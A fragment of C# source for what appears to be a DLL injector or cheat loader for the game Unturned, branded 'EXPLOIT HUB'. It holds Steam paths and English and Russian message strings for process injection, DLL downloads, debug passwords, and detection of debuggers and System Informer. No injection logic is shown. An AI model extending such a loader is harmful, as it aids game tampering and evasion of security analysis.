                paths.Add(Path.Combine(drive.Name, "Program Files (x86)", "Steam", "steamapps", "common", "Unturned", "Unturned.exe"));
                paths.Add(Path.Combine(drive.Name, "Program Files", "Steam", "steamapps", "common", "Unturned", "Unturned.exe"));
                paths.Add(Path.Combine(drive.Name, "SteamLibrary", "steamapps", "common", "Unturned", "Unturned.exe"));
            }
            return paths;
        }


        private static class LanguageKeys
        {
            public const string AdminRequired = "AdminRequired";
            public const string SecurityAlert = "SecurityAlert";
            public const string SecurityViolationDetail = "SecurityViolationDetail";
            public const string SecurityViolationDetected = "SecurityViolationDetected";
            public const string Process = "Process";
            public const string User = "User";
            public const string Machine = "Machine";
            public const string ProcessMonitorFailed = "ProcessMonitorFailed";
            public const string LookingForProcess = "LookingForProcess";
            public const string ProcessFound = "ProcessFound";
            public const string ProcessNotFound = "ProcessNotFound";
            public const string ProcessStartFailed = "ProcessStartFailed";
            public const string ProcessStarted = "ProcessStarted";
            public const string ProcessInitFailed = "ProcessInitFailed";
            public const string ProcessInitWait = "ProcessInitWait";
            public const string ExeNotFoundMultiple = "ExeNotFoundMultiple";
            public const string InjectionSuccess = "InjectionSuccess";
            public const string InjectionFailed = "InjectionFailed";
            public const string InjectionException = "InjectionException";
            public const string GeneralError = "GeneralError";
            public const string DownloadStart = "DownloadStart";
            public const string DownloadComplete = "DownloadComplete";
            public const string DownloadFailed = "DownloadFailed";
            public const string CriticalError = "CriticalError";
            public const string InjectorFinished = "InjectorFinished";
            public const string AsciiArt = "AsciiArt";
            public const string InitializingLoader = "InitializingLoader";
            public const string LanguagePrompt = "LanguagePrompt";
            public const string InvalidLanguage = "InvalidLanguage";
            public const string LanguageSelected = "LanguageSelected";
            public const string DebugPrompt = "DebugPrompt";
            public const string DebugEnabled = "DebugEnabled";
            public const string DebugDisabled = "DebugDisabled";
            public const string FailedDebugAttempt = "FailedDebugAttempt";
            public const string PressAnyKey = "PressAnyKey";
            public const string RestartPrompt = "RestartPrompt";
            public const string ReinjectPrompt = "ReinjectPrompt";
            public const string NewUserDetected = "NewUserDetected";
            public const string Runtime = "Runtime";
            public const string ScreenshotFailed = "ScreenshotFailed";
            public const string Initializing = "Initializing";
            public const string ProcessLifetime = "ProcessLifetime";
            public const string ProcessClosedEarly = "ProcessClosedEarly";
            public const string Restarting = "Restarting";
            public const string Restarted = "Restarted";
            public const string RestartFailed = "RestartFailed";
            public const string ProcessValidationFailed = "ProcessValidationFailed";
            public const string SuspendDetected = "SuspendDetected";
            public const string SystemInformerDetected = "SystemInformerDetected";
        }

        private static readonly Dictionary<string, Dictionary<string, string>> Languages = new()
        {
            {
                "English", new Dictionary<string, string>
                {
                    { LanguageKeys.AdminRequired, "⚠️ Administrator privileges required!" },
                    { LanguageKeys.SecurityAlert, "Security violation detected! Exiting..." },
                    { LanguageKeys.SecurityViolationDetail, "System modification detected" },
                    { LanguageKeys.SecurityViolationDetected, "Suspicious process detected" },
                    { LanguageKeys.Process, "Process" },
                    { LanguageKeys.User, "User" },
                    { LanguageKeys.Machine, "Machine" },
                    { LanguageKeys.ProcessMonitorFailed, "Process monitoring failed" },
                    { LanguageKeys.LookingForProcess, "Searching for {0} process..." },
                    { LanguageKeys.ProcessFound, "Found target process: {0} (PID: {1})" },
                    { LanguageKeys.ProcessNotFound, "{0} process not found. Launching..." },
                    { LanguageKeys.ProcessStartFailed, "Failed to start process" },
                    { LanguageKeys.ProcessStarted, "Process started (PID: {0})" },
                    { LanguageKeys.ProcessInitFailed, "Process initialization failed" },
                    { LanguageKeys.ProcessInitWait, "Waiting for process initialization" },
                    { LanguageKeys.ExeNotFoundMultiple, "Executable not found in:\n{0}" },
                    { LanguageKeys.InjectionSuccess, "Successfully injected {0}!" },
                    { LanguageKeys.InjectionFailed, "Injection failed" },
                    { LanguageKeys.InjectionException, "Injection error" },
                    { LanguageKeys.GeneralError, "Error" },
                    { LanguageKeys.DownloadStart, "Downloading {0}..." },
                    { LanguageKeys.DownloadComplete, "Download completed!" },
                    { LanguageKeys.DownloadFailed, "Download failed: {0}" },
                    { LanguageKeys.CriticalError, "Critical error" },
                    { LanguageKeys.InjectorFinished, "Injection process completed" },
                    { LanguageKeys.AsciiArt,
                    @"
_______      ___    ___ ________  ___       ________  ___  _________        ___  ___  ___  ___  ________     
|\  ___ \    |\  \  /  /|\   __  \|\  \     |\   __  \|\  \|\___   ___\     |\  \|\  \|\  \|\  \|\   __  \    
\ \   __/|   \ \  \/  / | \  \|\  \ \  \    \ \  \|\  \ \  \|___ \  \_|     \ \  \\\  \ \  \\\  \ \  \|\ /_   
 \ \  \_|/__  \ \    / / \ \   ____\ \  \    \ \  \\\  \ \  \   \ \  \       \ \   __  \ \  \\\  \ \   __  \  
  \ \  \_|\ \  /     \/   \ \  \___|\ \  \____\ \  \\\  \ \  \   \ \  \       \ \  \ \  \ \  \\\  \ \  \|\  \ 
   \ \_______\/  /\   \    \ \__\    \ \_______\ \_______\ \__\   \ \__\       \ \__\ \__\ \_______\ \_______\
    \|_______/__/ /\ __\    \|__|     \|_______|\|_______|\|__|    \|__|        \|__|\|__|\|_______|\|_______|
             |__|/ \|__|                                                                                      
                                                                                                              
                                                                                                              " },
                    { LanguageKeys.InitializingLoader, "Initializing injection system..." },
                    { LanguageKeys.LanguagePrompt, "Select language:\n1. English\n2. Русский\n> " },
                    { LanguageKeys.InvalidLanguage, "Invalid selection! Using English" },
                    { LanguageKeys.LanguageSelected, "Selected language: English" },
                    { LanguageKeys.DebugPrompt, "Debug password: " },
                    { LanguageKeys.DebugEnabled, "[DEBUG MODE ACTIVE]" },
                    { LanguageKeys.DebugDisabled, "[DEBUG MODE INACTIVE]" },
                    { LanguageKeys.FailedDebugAttempt, "Failed debug attempt detected" },
                    { LanguageKeys.PressAnyKey, "\nPress any key to exit..." },
                    { LanguageKeys.RestartPrompt, "Restart application? (Y/N)" },
                    { LanguageKeys.ReinjectPrompt, "Re-inject DLL? (Y/N)" },
                    { LanguageKeys.NewUserDetected, "New user detected" },
                    { LanguageKeys.Runtime, "Runtime" },
                    { LanguageKeys.ScreenshotFailed, "Failed to capture screenshot" },
                    { LanguageKeys.Initializing, "Initializing" },
                    { LanguageKeys.ProcessLifetime, "Process lifetime" },
                    { LanguageKeys.ProcessClosedEarly, "Process closed too soon: {0}" },
                    { LanguageKeys.Restarting, "Restarting application..." },
                    { LanguageKeys.Restarted, "Application restarted successfully" },
                    { LanguageKeys.RestartFailed, "Restart failed" },
                    { LanguageKeys.ProcessValidationFailed, "Process validation failed" },
                    { LanguageKeys.SuspendDetected, "Suspicious thread activity detected!" },
                    { LanguageKeys.SystemInformerDetected, "System Informer detected!" }
                }
            },
            {
                "Russian", new Dictionary<string, string>
                {
                    { LanguageKeys.AdminRequired, "⚠️ Требуются права Администратора!" },
                    { LanguageKeys.SecurityAlert, "Обнаружено нарушение безопасности! Выход..." },
                    { LanguageKeys.SecurityViolationDetail, "Обнаружено изменение системы" },
                    { LanguageKeys.SecurityViolationDetected, "Обнаружен подозрительный процесс" },
                    { LanguageKeys.Process, "Процесс" },
                    { LanguageKeys.User, "Пользователь" },
                    { LanguageKeys.Machine, "Компьютер" },
                    { LanguageKeys.ProcessMonitorFailed, "Ошибка мониторинга процессов" },
                    { LanguageKeys.LookingForProcess, "Поиск процесса {0}..." },
                    { LanguageKeys.ProcessFound, "Найден целевой процесс: {0} (PID: {1})" },
                    { LanguageKeys.ProcessNotFound, "Процесс {0} не найден. Запуск..." },
                    { LanguageKeys.ProcessStartFailed, "Ошибка запуска процесса" },
                    { LanguageKeys.ProcessStarted, "Процесс запущен (PID: {0})" },
                    { LanguageKeys.ProcessInitFailed, "Ошибка инициализации процесса" },
                    { LanguageKeys.ProcessInitWait, "Ожидание инициализации процесса" },
                    { LanguageKeys.ExeNotFoundMultiple, "Файл не найден в:\n{0}" },
                    { LanguageKeys.InjectionSuccess, "Успешная инъекция {0}!" },
                    { LanguageKeys.InjectionFailed, "Ошибка инъекции" },
                    { LanguageKeys.InjectionException, "Ошибка инъекции" },
                    { LanguageKeys.GeneralError, "Ошибка" },
                    { LanguageKeys.DownloadStart, "Загрузка {0}..." },
                    { LanguageKeys.DownloadComplete, "Загрузка завершена!" },
                    { LanguageKeys.DownloadFailed, "Ошибка загрузки: {0}" },
                    { LanguageKeys.CriticalError, "Критическая ошибка" },
                    { LanguageKeys.InjectorFinished, "Процесс инъекции завершен" },
                    { LanguageKeys.AsciiArt,
                    @"
_______      ___    ___ ________  ___       ________  ___  _________        ___  ___  ___  ___  ________     
|\  ___ \    |\  \  /  /|\   __  \|\  \     |\   __  \|\  \|\___   ___\     |\  \|\  \|\  \|\  \|\   __  \    
\ \   __/|   \ \  \/  / | \  \|\  \ \  \    \ \  \|\  \ \  \|___ \  \_|     \ \  \\\  \ \  \\\  \ \  \|\ /_   
 \ \  \_|/__  \ \    / / \ \   ____\ \  \    \ \  \\\  \ \  \   \ \  \       \ \   __  \ \  \\\  \ \   __  \  
  \ \  \_|\ \  /     \/   \ \  \___|\ \  \____\ \  \\\  \ \  \   \ \  \       \ \  \ \  \ \  \\\  \ \  \|\  \ 
   \ \_______\/  /\   \    \ \__\    \ \_______\ \_______\ \__\   \ \__\       \ \__\ \__\ \_______\ \_______\
    \|_______/__/ /\ __\    \|__|     \|_______|\|_______|\|__|    \|__|        \|__|\|__|\|_______|\|_______|
             |__|/ \|__|                                                                                      
                                                                                                              
                                                                                                              " },
                    { LanguageKeys.InitializingLoader, "Инициализация системы инъекций..." },
                    { LanguageKeys.LanguagePrompt, "Выберите язык:\n1. English\n2. Русский\n> " },
                    { LanguageKeys.InvalidLanguage, "Ошибка выбора! Используется русский" },
                    { LanguageKeys.LanguageSelected, "Выбран язык: Русский" },
                    { LanguageKeys.DebugPrompt, "Пароль отладки: " },
                    { LanguageKeys.DebugEnabled, "[РЕЖИМ ОТЛАДКИ АКТИВЕН]" },
                    { LanguageKeys.DebugDisabled, "[РЕЖИМ ОТЛАДКИ ВЫКЛЮЧЕН]" },
                    { LanguageKeys.FailedDebugAttempt, "Обнаружена попытка отладки" },
                    { LanguageKeys.PressAnyKey, "\nНажмите любую клавишу для выхода..." },
                    { LanguageKeys.RestartPrompt, "Перезапустить приложение? (Д/Н)" },
                    { LanguageKeys.ReinjectPrompt, "Повторить инъекцию? (Д/Н)" },
                    { LanguageKeys.NewUserDetected, "Обнаружен новый пользователь" },
                    { LanguageKeys.Runtime, "Время работы" },
                    { LanguageKeys.ScreenshotFailed, "Ошибка создания скриншота" },
                    { LanguageKeys.Initializing, "Инициализация" },
                    { LanguageKeys.ProcessLifetime, "Время жизни процесса" },
                    { LanguageKeys.ProcessClosedEarly, "Процесс завершен слишком рано: {0}" },
                    { LanguageKeys.Restarting, "Перезапуск приложения..." },
                    { LanguageKeys.Restarted, "Приложение успешно перезапущено" },
                    { LanguageKeys.RestartFailed, "Ошибка перезапуска" },
                    { LanguageKeys.ProcessValidationFailed, "Ошибка проверки процесса" },
                    { LanguageKeys.SuspendDetected, "Обнаружена подозрительная активность потоков!" },
                    { LanguageKeys.SystemInformerDetected, "Обнаружен System Informer!" }
                }
            }
        };
    }
}